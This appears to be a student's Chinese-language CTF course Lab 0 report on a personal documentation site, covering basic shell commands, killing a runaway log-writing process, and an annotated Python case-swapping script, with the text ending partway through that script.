<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
<meta charset="utf-8"/>
<meta content="width=device-width,initial-scale=1" name="viewport"/>
<meta content="TNT的github.io" name="description"/>
<link href="../../others/test/" rel="prev"/>
<link href="../misc_lab1/" rel="next"/>
<link href="../../assets/images/favicon.png" rel="icon"/>
<meta content="mkdocs-1.6.1, mkdocs-material-9.5.42" name="generator"/>
<title>lab0 - AlabTNT's Github IO</title>
<link href="../../assets/stylesheets/main.0253249f.min.css" rel="stylesheet"/>
<link href="../../assets/stylesheets/palette.06af60db.min.css" rel="stylesheet"/>
<link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/>
<link href="https://fonts.googleapis.com/css?family=JetBrains+Mono:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&amp;display=fallback" rel="stylesheet"/>
<style>:root{--md-text-font:"JetBrains Mono";--md-code-font:"JetBrains Mono"}</style>
<link href="../../css/heti.css" rel="stylesheet"/>
<link href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css" rel="stylesheet"/>
<script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
</head>
<body data-md-color-accent="indigo" data-md-color-primary="indigo" data-md-color-scheme="default" dir="ltr">
<input autocomplete="off" class="md-toggle" data-md-toggle="drawer" id="__drawer" type="checkbox"/>
<input autocomplete="off" class="md-toggle" data-md-toggle="search" id="__search" type="checkbox"/>
<label class="md-overlay" for="__drawer"></label>
<div data-md-component="skip">
<a class="md-skip" href="#ctf101-lab0-report">
          Skip to content
        </a>
</div>
<div data-md-component="announce">
</div>
<header class="md-header" data-md-component="header">
<nav aria-label="Header" class="md-header__inner md-grid">
<a aria-label="AlabTNT's Github IO" class="md-header__button md-logo" data-md-component="logo" href="../.." title="AlabTNT's Github IO">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
</a>
<label class="md-header__button md-icon" for="__drawer">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg>
</label>
<div class="md-header__title" data-md-component="header-title">
<div class="md-header__ellipsis">
<div class="md-header__topic">
<span class="md-ellipsis">
            AlabTNT's Github IO
          </span>
</div>
<div class="md-header__topic" data-md-component="header-topic">
<span class="md-ellipsis">
            
              lab0
            
          </span>
</div>
</div>
</div>
<form class="md-header__option" data-md-component="palette">
<input aria-label="Switch to dark mode" class="md-option" data-md-color-accent="indigo" data-md-color-media="(prefers-color-scheme: light)" data-md-color-primary="indigo" data-md-color-scheme="default" id="__palette_0" name="__palette" type="radio"/>
<label class="md-header__button md-icon" for="__palette_1" hidden="" title="Switch to dark mode">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"></path></svg>
</label>
<input aria-label="Switch to light mode" class="md-option" data-md-color-accent="indigo" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-primary="indigo" data-md-color-scheme="slate" id="__palette_1" name="__palette" type="radio"/>
<label class="md-header__button md-icon" for="__palette_0" hidden="" title="Switch to light mode">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"></path></svg>
</label>
</form>
<script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
<label class="md-header__button md-icon" for="__search">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
</label>
<div class="md-search" data-md-component="search" role="dialog">
<label class="md-search__overlay" for="__search"></label>
<div class="md-search__inner" role="search">
<form class="md-search__form" name="search">
<input aria-label="Search" autocapitalize="off" autocomplete="off" autocorrect="off" class="md-search__input" data-md-component="search-query" name="query" placeholder="Search" required="" spellcheck="false" type="text"/>
<label class="md-search__icon md-icon" for="__search">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg>
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg>
</label>
<nav aria-label="Search" class="md-search__options">
<button aria-label="Clear" class="md-search__icon md-icon" tabindex="-1" title="Clear" type="reset">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg>
</button>
</nav>
</form>
<div class="md-search__output">
<div class="md-search__scrollwrap" data-md-scrollfix="" tabindex="0">
<div class="md-search-result" data-md-component="search-result">
<div class="md-search-result__meta">
            Initializing search
          </div>
<ol class="md-search-result__list" role="presentation"></ol>
</div>
</div>
</div>
</div>
</div>
</nav>
</header>
<div class="md-container" data-md-component="container">
<nav aria-label="Tabs" class="md-tabs" data-md-component="tabs">
<div class="md-grid">
<ul class="md-tabs__list">
<li class="md-tabs__item">
<a class="md-tabs__link" href="../../tutorial.md">
          
  
  TNT麻将教程

        </a>
</li>
<li class="md-tabs__item">
<a class="md-tabs__link" href="../../eating/">
          
  
  TNT Eating

        </a>
</li>
<li class="md-tabs__item">
<a class="md-tabs__link" href="../../others/cbt/">
          
  
  TNTSiteOthers

        </a>
</li>
<li class="md-tabs__item md-tabs__item--active">
<a class="md-tabs__link" href="./">
          
  
  CTF2025

        </a>
</li>
</ul>
</div>
</nav>
<main class="md-main" data-md-component="main">
<div class="md-main__inner md-grid">
<div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation">
<div class="md-sidebar__scrollwrap">
<div class="md-sidebar__inner">
<nav aria-label="Navigation" class="md-nav md-nav--primary md-nav--lifted" data-md-level="0">
<label class="md-nav__title" for="__drawer">
<a aria-label="AlabTNT's Github IO" class="md-nav__button md-logo" data-md-component="logo" href="../.." title="AlabTNT's Github IO">
<svg viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"></path></svg>
</a>
    AlabTNT's Github IO
  </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_1" type="checkbox"/>
<label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="0">
<span class="md-ellipsis">
    TNT麻将教程
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_1_label" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_1">
<span class="md-nav__icon md-icon"></span>
            TNT麻将教程
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../tutorial.md">
<span class="md-ellipsis">
    主页
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../tutorial/0.0/">
<span class="md-ellipsis">
    零、前言
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../tutorial/1.0/">
<span class="md-ellipsis">
    一、麻将基础内容及基本规则
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../tutorial/2.0/">
<span class="md-ellipsis">
    二、日本麻将（マージャン）规则介绍
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../tutorial/3.0/">
<span class="md-ellipsis">
    三、国内麻将规则归纳（部分）
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../tutorial/4.0/">
<span class="md-ellipsis">
    四、TNT公式战分数规则
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../tutorial/5.0/">
<span class="md-ellipsis">
    五、线下礼仪
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../tutorial/end/">
<span class="md-ellipsis">
    结语
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../tutorial/app.1/">
<span class="md-ellipsis">
    附录1*：日麻役种表
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../tutorial/app.2/">
<span class="md-ellipsis">
    附录2*：日麻点数、符数速查表 &amp; 番种速查
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../tutorial/app.3/">
<span class="md-ellipsis">
    附录3*：术语收录一览
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../tutorial/app.4/">
<span class="md-ellipsis">
    附录4*：M-League相关内容
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_2" type="checkbox"/>
<label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
<span class="md-ellipsis">
    TNT Eating
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_2_label" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_2">
<span class="md-nav__icon md-icon"></span>
            TNT Eating
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../eating/">
<span class="md-ellipsis">
    主页
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--nested">
<input class="md-nav__toggle md-toggle md-toggle--indeterminate" id="__nav_3" type="checkbox"/>
<label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
<span class="md-ellipsis">
    TNTSiteOthers
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="false" aria-labelledby="__nav_3_label" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_3">
<span class="md-nav__icon md-icon"></span>
            TNTSiteOthers
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="../../others/cbt/">
<span class="md-ellipsis">
    pycbt
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../others/izatomo/">
<span class="md-ellipsis">
    izatomo
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../../others/test/">
<span class="md-ellipsis">
    test
  </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
<input checked="" class="md-nav__toggle md-toggle" id="__nav_4" type="checkbox"/>
<label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
<span class="md-ellipsis">
    CTF2025
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<nav aria-expanded="true" aria-labelledby="__nav_4_label" class="md-nav" data-md-level="1">
<label class="md-nav__title" for="__nav_4">
<span class="md-nav__icon md-icon"></span>
            CTF2025
          </label>
<ul class="md-nav__list" data-md-scrollfix="">
<li class="md-nav__item md-nav__item--active">
<input class="md-nav__toggle md-toggle" id="__toc" type="checkbox"/>
<label class="md-nav__link md-nav__link--active" for="__toc">
<span class="md-ellipsis">
    lab0
  </span>
<span class="md-nav__icon md-icon"></span>
</label>
<a class="md-nav__link md-nav__link--active" href="./">
<span class="md-ellipsis">
    lab0
  </span>
</a>
<nav aria-label="Table of contents" class="md-nav md-nav--secondary">
<label class="md-nav__title" for="__toc">
<span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="#3240102120">
<span class="md-ellipsis">
      3240102120
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#prerequisite">
<span class="md-ellipsis">
      Prerequisite
    </span>
</a>
<nav aria-label="Prerequisite" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#challenge-1">
<span class="md-ellipsis">
      Challenge 1
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#challenge-2">
<span class="md-ellipsis">
      Challenge 2
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#misc">
<span class="md-ellipsis">
      MISC
    </span>
</a>
<nav aria-label="MISC" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#challenge-1_1">
<span class="md-ellipsis">
      Challenge 1
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#challenge-2_1">
<span class="md-ellipsis">
      Challenge 2
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#crypto">
<span class="md-ellipsis">
      Crypto
    </span>
</a>
<nav aria-label="Crypto" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#challenge-1_2">
<span class="md-ellipsis">
      Challenge 1
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#challenge-2_2">
<span class="md-ellipsis">
      Challenge 2
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#pwn">
<span class="md-ellipsis">
      Pwn
    </span>
</a>
<nav aria-label="Pwn" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#task1">
<span class="md-ellipsis">
      Task1
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#task2">
<span class="md-ellipsis">
      Task2
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#task3">
<span class="md-ellipsis">
      Task3
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#web">
<span class="md-ellipsis">
      Web
    </span>
</a>
<nav aria-label="Web" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#challenge-1_3">
<span class="md-ellipsis">
      Challenge 1
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#challenge-2_3">
<span class="md-ellipsis">
      Challenge 2
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#reverse">
<span class="md-ellipsis">
      Reverse
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../misc_lab1/">
<span class="md-ellipsis">
    misc_lab1
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../rev_lab1/">
<span class="md-ellipsis">
    rev_lab1
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../pwn_lab1/">
<span class="md-ellipsis">
    pwn_lab1
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../web_lab1/">
<span class="md-ellipsis">
    web_lab1
  </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="../crypto_lab1/">
<span class="md-ellipsis">
    crypto_lab1
  </span>
</a>
</li>
</ul>
</nav>
</li>
</ul>
</nav>
</div>
</div>
</div>
<div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
<div class="md-sidebar__scrollwrap">
<div class="md-sidebar__inner">
<nav aria-label="Table of contents" class="md-nav md-nav--secondary">
<label class="md-nav__title" for="__toc">
<span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
<ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
<li class="md-nav__item">
<a class="md-nav__link" href="#3240102120">
<span class="md-ellipsis">
      3240102120
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#prerequisite">
<span class="md-ellipsis">
      Prerequisite
    </span>
</a>
<nav aria-label="Prerequisite" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#challenge-1">
<span class="md-ellipsis">
      Challenge 1
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#challenge-2">
<span class="md-ellipsis">
      Challenge 2
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#misc">
<span class="md-ellipsis">
      MISC
    </span>
</a>
<nav aria-label="MISC" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#challenge-1_1">
<span class="md-ellipsis">
      Challenge 1
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#challenge-2_1">
<span class="md-ellipsis">
      Challenge 2
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#crypto">
<span class="md-ellipsis">
      Crypto
    </span>
</a>
<nav aria-label="Crypto" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#challenge-1_2">
<span class="md-ellipsis">
      Challenge 1
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#challenge-2_2">
<span class="md-ellipsis">
      Challenge 2
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#pwn">
<span class="md-ellipsis">
      Pwn
    </span>
</a>
<nav aria-label="Pwn" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#task1">
<span class="md-ellipsis">
      Task1
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#task2">
<span class="md-ellipsis">
      Task2
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#task3">
<span class="md-ellipsis">
      Task3
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#web">
<span class="md-ellipsis">
      Web
    </span>
</a>
<nav aria-label="Web" class="md-nav">
<ul class="md-nav__list">
<li class="md-nav__item">
<a class="md-nav__link" href="#challenge-1_3">
<span class="md-ellipsis">
      Challenge 1
    </span>
</a>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#challenge-2_3">
<span class="md-ellipsis">
      Challenge 2
    </span>
</a>
</li>
</ul>
</nav>
</li>
<li class="md-nav__item">
<a class="md-nav__link" href="#reverse">
<span class="md-ellipsis">
      Reverse
    </span>
</a>
</li>
</ul>
</nav>
</div>
</div>
</div>
<div class="md-content" data-md-component="content">
<article class="md-content__inner md-typeset">
<h1 id="ctf101-lab0-report"><span>CTF101<span class="heti-spacing"> </span></span>短期课程<span><span class="heti-spacing"> </span>Lab0 Report</span><a class="headerlink" href="#ctf101-lab0-report" title="Permanent link"><span><span class="heti-spacing"> </span>¶</span></a></h1>
<p></p><center>
<h2 id="3240102120">3240102120<a class="headerlink" href="#3240102120" title="Permanent link">¶</a></h2>
<p></p></center>
<p>本报告用于提交<span class="heti-skip"><span class="heti-spacing"> </span>CTF101<span class="heti-spacing"> </span></span>课程<span><span class="heti-spacing"> </span>Lab 0</span>。由于去年参加了校赛，虽然成绩较差，但是仍然希望通过本课程学习<span class="heti-skip"><span class="heti-spacing"> </span>CTF<span class="heti-spacing"> </span></span>相关知识。</p>
<hr/>
<div class="admonition abstract">
<p class="admonition-title">报告中的一些小问题</p>
<p>由于我的开发起手比较野，导致我有一些规范和习俗并没有吸收。这可能导致我的报告包括但不限于以下问题之一：
- 参数起名比较随意
- 语法不会特别规范
- 部分黑盒内容不了解
- 部分指令理解出现偏差
敬请谅解！！！如有任何需要改进的问题，烦请及时指出，我将及时修改！！！</p>
</div>
<div class="admonition node">
<p class="admonition-title">一些代名</p>
<div class="admonition quote">
<p class="admonition-title">常言道<span><span class="heti-spacing"> </span>...</span></p>
<p>不会打歌嘛学打歌，阿哥咋摆你咋摆</p>
</div>
<p>学习前辈经验，在<span class="heti-skip"><span class="heti-spacing"> </span>CTF<span class="heti-spacing"> </span></span>上面有我个人的一些代名，在我的报告中可能出现在举例子、实例展示等环节，以下是我常用的一些代名。这并非做记号，因此在此提前声明！
- 2120（我的学号后四位）
- AlabTNT
- 41ebNTN
- hjt
- MoonCake__MC
- ybmc
- M00nC4k1</p>
</div>
<h2 id="prerequisite">Prerequisite<a class="headerlink" href="#prerequisite" title="Permanent link">¶</a></h2>
<h4 id="challenge-1">Challenge 1<a class="headerlink" href="#challenge-1" title="Permanent link">¶</a></h4>
<p><span>shell<span class="heti-spacing"> </span></span>命令用法比较多了吧，我比较常用的下面几个：</p>
<ul>
<li><code>screen</code> <span>:<span class="heti-spacing"> </span></span>创建新窗口，通常被我拿来挂一些后台程序，用法就是 <code>screen -S &lt;name&gt;</code>来创建窗口、<code>screen -r &lt;name&gt;</code> <span>attach<span class="heti-spacing"> </span></span>一个窗口，<code>screen -list</code> 来列出全部已打开窗口。</li>
<li><code>ssh</code> <span>:<span class="heti-spacing"> </span></span>用来使用<span class="heti-skip"><span class="heti-spacing"> </span>ssh<span class="heti-spacing"> </span></span>进行远程连接或是拉取内容等等。<span>ssh<span class="heti-spacing"> </span></span>后面一般跟地址。比如 <code>ssh root@alabtnt.com</code></li>
<li><code>tail</code> <span>:<span class="heti-spacing"> </span></span>展示一个文件的末尾内容。</li>
<li><code>ps</code> <span>:<span class="heti-spacing"> </span></span>查看全部进程。</li>
<li><code>pwd</code> <span>:<span class="heti-spacing"> </span></span>展示当前所在位置的绝对路径。</li>
<li><code>dir</code> <span>:<span class="heti-spacing"> </span></span>显示当前文件夹全部内容，也可以用 <code>ls</code> 代替。例如 <code>ls -a</code>可以展示详细文件。</li>
<li><code>cd</code> <span>:<span class="heti-spacing"> </span></span><code>dir</code>和 <code>pwd</code> 太水了（虽然这个也很水<heti-adjacent class="heti-adjacent-half">）</heti-adjacent>：进入一个文件夹。索引父级文件夹使用 <code>..</code> 例如 <code>cd ../alabtntctf</code> 进入与当前所在位置同级的另一个文件夹。</li>
</ul>
<p>连接到我的<span class="heti-skip"><span class="heti-spacing"> </span>Linux<span class="heti-spacing"> </span></span>机器：<code>wsl -d Debian</code>。或者连接到我的<span class="heti-skip"><span class="heti-spacing"> </span>Linux<span class="heti-spacing"> </span></span>服务器 <code>ssh root@******.***</code></p>
<p><strong>Saint Join</strong>:</p>
<p>这个玩意解决的太快以至于忘记截图（</p>
<p><img alt="alt text" src="../lab0_0.png"/></p>
<p>题目描述有一个进程正在向<span class="heti-skip"><span class="heti-spacing"> </span>bad.log<span class="heti-spacing"> </span></span>里面持续写东西，关掉这个“磁盘爆爆器”，首先它是个进程，所以先<code>ps auxf</code>拿列表。然后扫了一下就能找到一个叫<code>badlog.py</code>的<span class="heti-skip"><span class="heti-spacing"> </span>python<span class="heti-spacing"> </span></span>进程，于是尝试<span class="heti-skip"><span class="heti-spacing"> </span>kill<span class="heti-spacing"> </span></span>一下。<span>kill<span class="heti-spacing"> </span></span>完<span class="heti-skip"><span class="heti-spacing"> </span>check solution<span class="heti-spacing"> </span></span>就过了。</p>
<p><br/></p>
<h4 id="challenge-2">Challenge 2<a class="headerlink" href="#challenge-2" title="Permanent link">¶</a></h4>
<p><s><span>Python<span class="heti-spacing"> </span></span>我熟悉啊……<span>Python<span class="heti-spacing"> </span></span>我可太熟悉了（</s></p>
<p>以下直接在程序行末进行注释，不再单另文件。</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-0-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-0-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-0-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-0-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-0-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-0-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-0-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-0-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-0-10">10</a></span>
<span class="normal"><a href="#__codelineno-0-11">11</a></span>
<span class="normal"><a href="#__codelineno-0-12">12</a></span>
<span class="normal"><a href="#__codelineno-0-13">13</a></span>
<span class="normal"><a href="#__codelineno-0-14">14</a></span>
<span class="normal"><a href="#__codelineno-0-15">15</a></span>
<span class="normal"><a href="#__codelineno-0-16">16</a></span></pre></div></td><td class="code"><div><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1"></a><span class="ch">#!/usr/bin/python3</span>
<a id="__codelineno-0-2" name="__codelineno-0-2"></a>
<a id="__codelineno-0-3" name="__codelineno-0-3"></a><span class="n">data</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s2">"give me your string: "</span><span class="p">)</span>  <span class="c1"># 显示"give me your string: "并等待输入，然后将输入的内容存入data（类型str）</span>
<a id="__codelineno-0-4" name="__codelineno-0-4"></a><span class="nb">print</span><span class="p">(</span><span class="s2">"length of string:"</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span> <span class="c1"># 打印"length of string: "然后是data的长度。长度指的就是data字符数</span>
<a id="__codelineno-0-5" name="__codelineno-0-5"></a>
<a id="__codelineno-0-6" name="__codelineno-0-6"></a><span class="n">data_old</span> <span class="o">=</span> <span class="n">data</span> <span class="c1"># 把data存到old_data里</span>
<a id="__codelineno-0-7" name="__codelineno-0-7"></a><span class="n">data_new</span> <span class="o">=</span> <span class="s2">""</span> <span class="c1"># 让data_new的值设为""。或者说是初始化一个str data_new</span>
<a id="__codelineno-0-8" name="__codelineno-0-8"></a><span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span> <span class="c1"># 在data中遍历。每个字符用d代替</span>
<a id="__codelineno-0-9" name="__codelineno-0-9"></a>    <span class="k">if</span> <span class="n">d</span> <span class="ow">in</span> <span class="s1">'abcdefghijklmnopqrstuvwxyz'</span><span class="p">:</span> <span class="c1">#如果那个字符是个小写字母</span>
<a id="__codelineno-0-10" name="__codelineno-0-10"></a>        <span class="n">data_new</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="o">-</span> <span class="mi">32</span><span class="p">)</span> <span class="c1"># 给data_new末尾加上它对应的大写字母。ord就是转ascii，chr从ascii转回来，-32就是从小写到大写</span>
<a id="__codelineno-0-11" name="__codelineno-0-11"></a>    <span class="k">elif</span> <span class="n">d</span> <span class="ow">in</span> <span class="s1">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span><span class="p">:</span> <span class="c1"># 如果是大写的</span>
<a id="__codelineno-0-12" name="__codelineno-0-12"></a>        <span class="n">data_new</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">d</span><span class="p">)</span> <span class="o">+</span> <span class="mi">32</span><span class="p">)</span> <span class="c1"># 就加上小写的</span>
<a id="__codelineno-0-13" name="__codelineno-0-13"></a>    <span class="k">else</span><span class="p">:</span> <span class="c1"># 不是字母</span>
<a id="__codelineno-0-14" name="__codelineno-0-14"></a>        <span class="n">data_new</span> <span class="o">+=</span> <span class="n">d</span> <span class="c1"># 保持不变</span>
